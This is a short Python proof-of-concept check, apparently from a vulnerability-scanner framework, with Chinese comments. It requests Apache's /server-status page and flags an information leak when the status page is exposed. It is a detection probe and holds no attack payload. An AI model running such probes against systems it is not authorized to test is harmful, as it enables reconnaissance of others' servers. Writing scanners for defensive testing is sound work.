import requests
from base import headers
from YmfPoc import YmfPoc


class apache_server_status_disclosure_BaseBerify(YmfPoc):

    def __init__(self, url):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "apache server-status信息泄漏",  # poc命名
            "product": "apache",  # poc针对的应用和版本
            "author": "unknown",  # poc作者
            "date": "2018/10/27",  # poc编写日期   如2018/10/26
            "description": "apache的状态信息文件泄漏",  # poc友好说明
        }
        self.options = {  # poc需要的参数
            "url": url,
        }
        self.result = {
            "status": False,  # poc执行后的状态 1-漏洞存在，0-漏洞不存在
            "data": "",  # poc执行返回数据
            "error": "",  # poc error返回
        }

    def verify(self):
        payload = "/server-status"
        vulnurl = self.options['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Server uptime" in req.text and r"Server Status" in req.text and req.status_code == 200:
                self.result['status'] = True
            else:
                self.result['status'] = False

        except:
            self.result['status'] = False
            self.result['error'] = "连接超时"


